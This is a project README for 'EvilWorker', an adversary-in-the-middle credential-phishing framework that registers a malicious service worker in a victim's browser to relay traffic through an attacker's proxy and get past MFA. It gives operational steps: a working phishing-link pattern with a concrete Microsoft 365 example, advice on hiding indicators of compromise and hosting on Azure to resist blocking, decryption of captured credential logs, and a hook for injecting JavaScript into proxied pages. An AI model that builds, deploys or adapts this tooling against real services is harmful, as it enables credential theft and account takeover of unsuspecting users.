# EvilWorker

**EvilWorker** is a new Adversary-in-the-Middle (AiTM) attack framework — based on leveraging [service workers](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) — designed to conduct credential phishing campaigns. <br>

Full article: https://medium.com/@ahaz1701/evilworker-da94ae171249.

## TL;DR

[Evilginx2](https://github.com/kgretzky/evilginx2) has established itself as the indispensable reference in the field of AiTM attacks. Thanks to its modular architecture, this solution can easily adapt to any platform, such as mainstream services (like *Microsoft Office 365* or *Google*) or internal web applications, and dynamically bypass advanced security mechanisms including MFA.

Despite its effectiveness, **Evilginx2 faces certain technical limitations inherent to its architecture**:
1. Its use relies heavily on the development and maintenance of configuration files for each legitimate service.
2. The systematic substitution of legitimate domain names with a malicious one — within HTTP responses relayed by the proxy server — may disrupt the proper rendering and operation of the service. Furthermore, this strategy can be easily neutralized by using a code obfuscation engine or by implementing a dynamic domain name generation process for critical resources.
3. The acquisition and configuration of new domains and subdomains capable of bypassing modern security filters are necessary for each Red Teaming engagement.

In response to the identified limitations, I have developed an innovative approach aimed at contributing to the evolution of AiTM techniques, both on an operational and strategic level. <br>
Unlike the Evilginx2 method — which requires manual configuration steps and the development of *phishlets* — **my goal was to design a fully autonomous and dynamic solution, capable of adapting in real time to any legitimate service**.

To develop this solution, I leveraged [service workers](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) — a native technology in modern browsers originally designed to enhance the user experience. <br>
When a victim clicks on a phishing link, **a service worker is immediately registered within their browser and acts as a malicious proxy**. Nearly all requests made within the context of the web application are redirected to a remote proxy server — controlled by the attacker — which forwards them to the legitimate service and then relays the responses back to the victim.

**This innovative approach offers a proxying mechanism that is far more efficient than Evilginx2**, while overcoming the technical limitations inherent to its architecture — namely, the need to develop and maintain configuration files for each service, as well as the issues related to the systematic substitution of legitimate domain names. <br>
Additionally, **the malicious proxy server requires only the use of a primary domain and a subdomain to operate, and it is compatible with PaaS** (unlike Evilginx2), such as [Azure Web Apps Service](https://azure.microsoft.com/en-us/products/app-service/web). The shared nature of this type of platform makes any degradation of the main domain's reputation virtually impossible — such an action would affect the entire ecosystem, **thereby offering implicit protection against blocking or negative categorization mechanisms used by traditional security solutions**.

## Getting Started

### Prerequisites

> [!NOTE]
> EvilWorker relies exclusively on standard Node.js libraries, thereby avoiding any external dependencies that could potentially compromise its long-term reliability.

It is strongly recommended to use **Node.js version 22.15.0 or higher** to ensure support for [zstd](https://nodejs.org/api/zlib.html) compression and decompression algorithms by the malicious proxy server.

### Installation

```bash
git clone https://github.com/Ahaz1701/EvilWorker.git
```

It is strongly recommended to host EvilWorker on a PaaS such as [Azure Web Apps Service](https://azure.microsoft.com/en-us/products/app-service/web).

## Usage

> [!NOTE]
> EvilWorker is an autonomous and dynamic solution that does not require the development of specific configuration files to adapt in real time to the targeted legitimate service.

### Demo of EvilWorker

A real-time proxying of legitimate *[Microsoft Office 365](https://login.microsoftonline.com/)*, *[Stack Overflow](https://stackoverflow.com/)*, *[Netflix](https://www.netflix.com/)*, and *[GitHub](https://github.com/)* services, centralized on a single domain and subdomain provisioned by *[Azure Web Apps](https://azure.microsoft.com/en-US/products/app-service/web)*:

### Create a valid phishing link

To create a valid phishing link, you simply need to follow the pattern below:

```
// Pattern to follow to create a valid phishing link
http(s)://$PHISHING_DOMAIN_NAME$PROXY_ENTRY_POINT&$PHISHED_URL_PARAMETER=$LEGITIMATE_LOGIN_PAGE_URL

// A concrete example of a valid phishing link
https://ahb-test.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

If the malicious proxy server fails to proxy the victim’s HTTP traffic, it is recommended to read the full [article](https://medium.com/@ahaz1701/evilworker-da94ae171249) to understand the specific cases that may cause issues and how to resolve them.

### Minimize the IOCs

To minimize EvilWorker's indicators of compromise (IOCs), it is recommended to modify:
- The value of the `PROXY_ENTRY_POINT` variable:

```javascript
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
```

- The value of the `PHISHED_URL_PARAMETER` variable in all project files:

```javascript
const PHISHED_URL_PARAMETER = "redirect_urI";
```

- The names of the following files and paths in all project files:

```javascript
const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};
```

### Encrypt and decrypt credentials

> [!NOTE]
> EvilWorker includes a logging system for intercepted communications, which are systematically encrypted using the *AES-256* algorithm in *CTR* mode.

It is strongly recommended to modify the encryption key and store it more securely for real engagements.

```javascript
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
```

Intercepted communications are automatically stored in the `phishing_logs` directory at the root of the project. 

To decrypt them, simply run the following command:

```bash
node decrypt_log_file.js $ENCRYPTED_LOG_FILE_PATH
```

### Add custom JavaScript code

> [!NOTE]
> EvilWorker includes a JavaScript code injection module specifically designed to bypass advanced security mechanisms implemented by the targeted services.

The `script_Vx9Z6XN5uC3k.js` file is automatically added to all HTML pages relayed by the malicious proxy server, so feel free to add your own JavaScript code to it.
